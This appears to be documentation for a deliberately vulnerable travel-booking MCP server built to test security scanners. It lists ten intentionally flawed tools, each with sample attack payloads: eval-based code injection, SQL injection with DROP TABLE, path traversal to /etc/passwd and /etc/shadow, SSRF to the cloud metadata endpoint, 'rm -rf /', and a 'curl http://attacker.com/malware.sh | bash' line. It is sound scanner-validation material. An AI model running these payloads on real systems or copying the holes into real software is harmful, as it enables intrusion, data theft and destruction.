# Travel MCP Server - Intentional Vulnerabilities Documentation

This document lists all intentional security vulnerabilities added to the Travel MCP Server for testing with the MCP security scanner.

## Overview

The Travel MCP Server now includes **10 vulnerable tools** designed to test various security scanning capabilities. These vulnerabilities are categorized into travel-specific vulnerabilities and critical system-level vulnerabilities.

---

## Travel-Specific Vulnerable Tools

These tools are contextually appropriate for a travel booking system and contain vulnerabilities that should be detected by security scanners.

### 1. `calculate_trip_cost` 
**Vulnerability:** CWE-94 - Code Injection via eval()
**Severity:** CRITICAL

**Description:** 
Uses `eval()` to calculate trip costs from user-provided formulas, allowing arbitrary code execution.

**Parameters:**
- `base_price` (float): Base price of trip
- `calculation_formula` (str): Python expression to evaluate

**Attack Examples:**
```python
# Legitimate use
calculate_trip_cost(1000, "base_price * 1.15")

# Malicious use
calculate_trip_cost(500, "__import__('os').system('whoami')")
calculate_trip_cost(800, "exec('import socket; s=socket.socket()...')")
```

---

### 2. `apply_discount_code`
**Vulnerability:** CWE-94 - Code Injection via eval()
**Severity:** CRITICAL

**Description:**
Evaluates discount codes as Python expressions without validation.

**Parameters:**
- `price` (float): Original price
- `discount_code` (str): Discount formula (evaluated!)

**Attack Examples:**
```python
# Legitimate use
apply_discount_code(1000, "price * 0.8")

# Malicious use
apply_discount_code(500, "__import__('os').listdir('/')")
apply_discount_code(300, "open('/etc/passwd').read()")
```

---

### 3. `generate_booking_confirmation`
**Vulnerability:** CWE-134 - Format String Vulnerability
**Severity:** HIGH

**Description:**
Uses unsafe string formatting with access to system namespace, allowing information disclosure.

**Parameters:**
- `passenger_name` (str): Passenger name
- `flight_id` (str): Flight ID
- `template` (str): Format string template

**Attack Examples:**
```python
# Legitimate use
generate_booking_confirmation("John", "FL001")

# Malicious use - Information Disclosure
generate_booking_confirmation("John", "FL001", "{sys.version}")
generate_booking_confirmation("John", "FL001", "{passenger_name.__class__.__mro__}")
generate_booking_confirmation("{__builtins__}", "FL001", "{passenger_name}")
```

---

### 4. `search_booking_by_name`
**Vulnerability:** CWE-89 - SQL Injection
**Severity:** CRITICAL

**Description:**
Constructs SQL queries using string concatenation instead of parameterized queries.

**Parameters:**
- `passenger_name` (str): Name to search (unvalidated!)

**Attack Examples:**
```python
# Legitimate use
search_booking_by_name("John Smith")

# Malicious use
search_booking_by_name("' OR '1'='1")
search_booking_by_name("'; DROP TABLE bookings; --")
search_booking_by_name("' UNION SELECT * FROM users --")
```

---

### 5. `download_travel_document`
**Vulnerability:** CWE-22 - Path Traversal
**Severity:** CRITICAL

**Description:**
Allows downloading files without path validation, enabling access to arbitrary files.

**Parameters:**
- `document_path` (str): Path to document (unvalidated!)

**Attack Examples:**
```python
# Legitimate use
download_travel_document("tickets/FL001.pdf")

# Malicious use
download_travel_document("../../../etc/passwd")
download_travel_document("../../app.py")
download_travel_document("C:\\Windows\\System32\\config\\SAM")
```

---

### 6. `fetch_destination_info`
**Vulnerability:** CWE-918 - Server-Side Request Forgery (SSRF)
**Severity:** CRITICAL

**Description:**
Makes HTTP requests to user-provided URLs without validation, allowing access to internal resources.

**Parameters:**
- `api_url` (str): URL to fetch from (unvalidated!)

**Attack Examples:**
```python
# Legitimate use
fetch_destination_info("https://api.travel.com/destinations/london")

# Malicious use
fetch_destination_info("http://localhost:8080/admin")
fetch_destination_info("http://169.254.169.254/latest/meta-data/")  # AWS metadata
fetch_destination_info("http://internal-service:3000/secrets")
fetch_destination_info("file:///etc/passwd")
```

---

## Critical System-Level Vulnerable Tools

These are extremely dangerous tools that provide direct system access. Already existed in the original codebase.

### 7. `read_file`
**Vulnerability:** CWE-22 - Path Traversal
**Severity:** CRITICAL

**Description:**
Reads arbitrary files from the filesystem with no validation.

**Attack Examples:**
```python
read_file("/etc/passwd")
read_file("../../../etc/shadow")
```

---

### 8. `write_file`
**Vulnerability:** CWE-73 - Arbitrary File Write
**Severity:** CRITICAL

**Description:**
Writes to any file location without validation.

**Attack Examples:**
```python
write_file("/tmp/malicious.sh", "#!/bin/bash\\nrm -rf /")
write_file("config.py", "ADMIN_PASSWORD='hacked'")
```

---

### 9. `execute_command`
**Vulnerability:** CWE-78 - OS Command Injection
**Severity:** CRITICAL

**Description:**
Executes arbitrary shell commands using `subprocess.run()` with `shell=True`.

**Attack Examples:**
```python
execute_command("whoami")
execute_command("curl http://attacker.com/malware.sh | bash")
execute_command("rm -rf / --no-preserve-root")
```

---

### 10. `database_query`
**Vulnerability:** CWE-89 - SQL Injection
**Severity:** CRITICAL

**Description:**
Executes raw SQL queries without parameterization.

**Attack Examples:**
```python
database_query("SELECT * FROM users")
database_query("DROP TABLE bookings; --")
database_query("UPDATE users SET role='admin' WHERE id=1")
```

---

## Summary Statistics

- **Total Vulnerable Tools:** 10
- **Critical Severity:** 9
- **High Severity:** 1
- **CWE Categories Covered:** 6
  - CWE-22: Path Traversal (2 tools)
  - CWE-73: Arbitrary File Write (1 tool)
  - CWE-78: OS Command Injection (1 tool)
  - CWE-89: SQL Injection (2 tools)
  - CWE-94: Code Injection (2 tools)
  - CWE-134: Format String (1 tool)
  - CWE-918: SSRF (1 tool)

---

## Testing with MCP Security Scanner

To test the scanner's detection capabilities:

1. **Start the Travel MCP Server:**
   ```bash
   python travel_mcp_server.py
   ```

2. **Run your security scanner** against the server

3. **Expected Detections:**
   The scanner should detect:
   - `eval()` usage in `calculate_trip_cost` and `apply_discount_code`
   - SQL injection in `search_booking_by_name` and `database_query`
   - Path traversal in `read_file`, `write_file`, and `download_travel_document`
   - Command injection in `execute_command`
   - SSRF in `fetch_destination_info`
   - Format string issues in `generate_booking_confirmation`

---

## Important Notes

⚠️ **WARNING:** This server is intentionally vulnerable and should NEVER be deployed in production!

🔒 **Purpose:** This server exists solely for security testing and scanner validation.

🧪 **Use Cases:**
- Testing MCP security scanners
- Training security researchers
- Demonstrating vulnerability patterns
- Validating detection tools

---

## Safe Travel Tools (No Known Vulnerabilities)

These tools should pass security scans:
- `search_flights`
- `search_hotels`
- `search_car_rentals`
- `get_flight_details`
- `get_hotel_details`
- `book_flight`

---

*Last Updated: 2025-11-10*

